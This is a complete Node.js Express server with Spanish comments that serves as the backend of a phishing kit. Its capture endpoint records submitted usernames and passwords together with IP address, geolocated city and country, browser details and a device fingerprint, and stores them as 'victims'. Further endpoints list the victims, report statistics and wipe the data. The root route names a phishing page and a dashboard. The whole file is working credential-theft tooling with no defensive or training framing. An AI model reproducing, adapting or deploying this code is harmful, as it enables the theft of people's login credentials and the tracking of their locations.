const express = require('express');
const cors = require('cors');
const geoip = require('geoip-lite');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

// Archivo para guardar víctimas
const DATA_FILE = path.join(__dirname, 'data', 'victims.json');

// Crear directorio data si no existe
if (!fs.existsSync(path.join(__dirname, 'data'))) {
    fs.mkdirSync(path.join(__dirname, 'data'));
}

// Inicializar archivo si no existe
if (!fs.existsSync(DATA_FILE)) {
    fs.writeFileSync(DATA_FILE, JSON.stringify([]));
}

// Funciones helper
function getVictims() {
    try {
        const data = fs.readFileSync(DATA_FILE, 'utf8');
        return JSON.parse(data);
    } catch (error) {
        return [];
    }
}

function saveVictim(victim) {
    const victims = getVictims();
    victims.push(victim);
    fs.writeFileSync(DATA_FILE, JSON.stringify(victims, null, 2));
}

// Generar fingerprint único del dispositivo
function generateFingerprint(ip, userAgent, platform, screenRes) {
    const data = `${ip}-${userAgent}-${platform}-${screenRes}`;
    return crypto.createHash('md5').update(data).digest('hex');
}

// Verificar si el dispositivo ya fue capturado
function isAlreadyCaptured(fingerprint) {
    const victims = getVictims();
    return victims.some(v => v.fingerprint === fingerprint);
}

// 🎯 ENDPOINT PRINCIPAL: Capturar datos (sin duplicados)
app.post('/api/capture', (req, res) => {
    // Obtener IP real (importante en Render)
    const ip = req.headers['x-forwarded-for']?.split(',')[0] || 
               req.headers['x-real-ip'] || 
               req.connection.remoteAddress;
    
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const platform = req.body.platform || 'Unknown';
    const screenResolution = req.body.screenResolution || 'Unknown';
    
    // Generar fingerprint único del dispositivo
    const fingerprint = generateFingerprint(ip, userAgent, platform, screenResolution);
    
    // ✅ VERIFICAR SI YA EXISTE
    if (isAlreadyCaptured(fingerprint)) {
        console.log('⚠️  Dispositivo duplicado ignorado:', ip);
        return res.json({ 
            success: false, 
            message: 'Dispositivo ya capturado anteriormente',
            duplicate: true
        });
    }
    
    const geo = geoip.lookup(ip);
    
    const victimData = {
        // Datos del formulario
        username: req.body.username || 'Visitor',
        password: req.body.password || 'N/A',
        
        // Información de red
        ip: ip,
        userAgent: userAgent,
        
        // Geolocalización
        country: geo?.country || 'Unknown',
        city: geo?.city || 'Unknown',
        region: geo?.region || 'Unknown',
        timezone: geo?.timezone || 'Unknown',
        
        // Información del navegador
        language: req.body.language || 'Unknown',
        platform: platform,
        screenResolution: screenResolution,
        cookiesEnabled: req.body.cookiesEnabled || false,
        
        // Fingerprint único (para evitar duplicados)
        fingerprint: fingerprint,
        
        // Timestamp
        timestamp: new Date().toISOString(),
        
        // Referrer
        referrer: req.headers.referer || 'Direct'
    };
    
    // Guardar
    saveVictim(victimData);
    
    // Log
    console.log('🎯 Nueva víctima:', victimData.username, '|', victimData.ip, '|', victimData.city);
    
    res.json({ 
        success: true, 
        message: 'Datos capturados correctamente',
        duplicate: false
    });
});

// 📊 ENDPOINT: Ver todas las víctimas
app.get('/api/victims', (req, res) => {
    const victims = getVictims();
    res.json(victims);
});

// 📈 ENDPOINT: Estadísticas
app.get('/api/stats', (req, res) => {
    const victims = getVictims();
    
    const stats = {
        total: victims.length,
        lastCapture: victims.length > 0 ? victims[victims.length - 1].timestamp : null,
        countries: [...new Set(victims.map(v => v.country))].length,
        cities: [...new Set(victims.map(v => v.city))].length,
        uniqueDevices: victims.length // Cada registro ya es único
    };
    
    res.json(stats);
});

// 🗑️ ENDPOINT: Limpiar datos
app.delete('/api/clear', (req, res) => {
    fs.writeFileSync(DATA_FILE, JSON.stringify([]));
    res.json({ success: true, message: 'Datos eliminados' });
});

// 🏠 Ruta raíz (health check)
app.get('/', (req, res) => {
    res.json({ 
        status: 'Server activo ✅',
        victims: getVictims().length,
        antiDuplicate: 'enabled ✅',
        endpoints: {
            capture: 'POST /api/capture',
            victims: 'GET /api/victims',
            stats: 'GET /api/stats',
            clear: 'DELETE /api/clear',
            phishing: 'GET /index.html',
            dashboard: 'GET /dashboard.html'
        }
    });
});

// Iniciar servidor
app.listen(PORT, () => {
    console.log(`🚀 Servidor corriendo en puerto ${PORT}`);
    console.log(`📊 Total víctimas: ${getVictims().length}`);
    console.log(`🛡️  Anti-duplicados: ACTIVO`);
});